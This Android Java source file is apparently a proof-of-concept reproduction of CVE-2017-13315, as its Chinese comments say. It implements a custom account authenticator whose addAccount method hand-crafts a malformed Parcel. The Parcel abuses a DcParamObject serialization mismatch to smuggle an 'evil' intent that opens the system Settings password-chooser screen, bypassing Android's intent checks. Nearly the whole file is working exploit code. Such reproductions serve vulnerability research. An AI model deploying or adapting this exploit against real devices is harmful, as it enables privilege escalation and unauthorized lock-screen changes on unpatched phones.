package me.safex;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;


/**
 * 案例 2: CVE-2017-13315 漏洞复现
 * 这个案例利用 DcParamObject 类中类似的序列化和反序列化不匹配问题。
 */
public class MyAuthenticatorCVE201713315 extends AbstractAccountAuthenticator{

    private Context mContext;
    private static final String TAG = "MyAuthenticator";

    public MyAuthenticatorCVE201713315(Context context) {
        super(context);
        this.mContext = context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
        Log.v(TAG, "addAccount");

        // Create the Parcel objects for serialization
        Parcel parcelData = Parcel.obtain();
        Parcel serializedData = Parcel.obtain();

        // Setup the serialized data
        serializedData.writeInt(3); // Number of elements in the map
        serializedData.writeString("mismatch");
        serializedData.writeInt(4); // VAL_PARCELABLE
        serializedData.writeString("com.android.internal.telephony.DcParamObject");
        serializedData.writeInt(1); // mSubId

        serializedData.writeInt(1);
        serializedData.writeInt(6);
        serializedData.writeInt(13);
        serializedData.writeInt(-1); // Dummy length holder
        int keyIntentStartPos = serializedData.dataPosition();

        // Insert the malicious intent
        serializedData.writeString(AccountManager.KEY_INTENT);
        serializedData.writeInt(4);
        serializedData.writeString("android.content.Intent");
        serializedData.writeString(Intent.ACTION_RUN);
        Uri.writeToParcel(serializedData, null);
        serializedData.writeString(null); // mType is null
        serializedData.writeInt(0x10000000); // Flags
        serializedData.writeString(null); // mPackage is null
        serializedData.writeString("com.android.settings");
        serializedData.writeString("com.android.settings.password.ChooseLockPassword");
        serializedData.writeInt(0); // mSourceBounds = null
        serializedData.writeInt(0); // mCategories = null
        serializedData.writeInt(0); // mSelector = null
        serializedData.writeInt(0); // mClipData = null
        serializedData.writeInt(-2); // mContentUserHint
        serializedData.writeBundle(null);

        // Calculate length of KEY_INTENT
        int keyIntentEndPos = serializedData.dataPosition();
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
        serializedData.setDataPosition(keyIntentStartPos - 4);
        serializedData.writeInt(lengthOfKeyIntent);
        serializedData.setDataPosition(keyIntentEndPos);

        // Padding data
        serializedData.writeString("Padding-Key");
        serializedData.writeInt(0); // VAL_STRING
        serializedData.writeString("Padding-Value");

        // Finalize the Parcel data
        int length = serializedData.dataSize();
        parcelData.writeInt(length);
        parcelData.writeInt(0x4c444E42); // Bundle magic
        parcelData.appendFrom(serializedData, 0, length);
        parcelData.setDataPosition(0);

        // Create the Bundle
        Bundle evilBundle = new Bundle();
        evilBundle.readFromParcel(parcelData);

        Log.d(TAG, "Evil bundle created: " + evilBundle.toString());
        return evilBundle;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return "";
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
        return null;
    }

    // Other required methods (can be left with default implementations)
}
